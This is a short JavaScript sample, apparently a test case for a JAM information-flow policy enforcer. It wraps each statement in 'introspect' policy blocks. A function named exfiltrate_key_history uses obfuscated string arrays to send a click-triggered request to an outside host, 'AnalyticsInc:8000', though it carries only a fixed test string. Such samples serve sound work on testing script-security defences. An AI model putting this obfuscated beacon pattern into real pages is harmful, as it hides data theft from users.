function exfiltrate_key_history() {
  var _0x2e14 = ["GET", "http://AnalyticsInc:8000/submission.html?", "test=java_obfuscator", "open", "send"];
  xmlhttp = new XMLHttpRequest;
  introspect(JAM.policy.p1) {
    var v0 = _0x2e14[3]
  }
  introspect(JAM.policy.p1) {
    var v1 = _0x2e14[0]
  }
  introspect(JAM.policy.p1) {
    var v5 = _0x2e14[1]
  }
  introspect(JAM.policy.p1) {
    var v6 = _0x2e14[2]
  }
  var v2 = v5 + v6;
  introspect(JAM.policy.p1) {
    xmlhttp[v0](v1, v2, true);
  }
  introspect(JAM.policy.p1) {
    var v3 = _0x2e14[4]
  }
  introspect(JAM.policy.p1) {
    xmlhttp[v3](null);
  }
  return;
}
var v4 = document.getElementById("test");
v4.onclick = exfiltrate_key_history
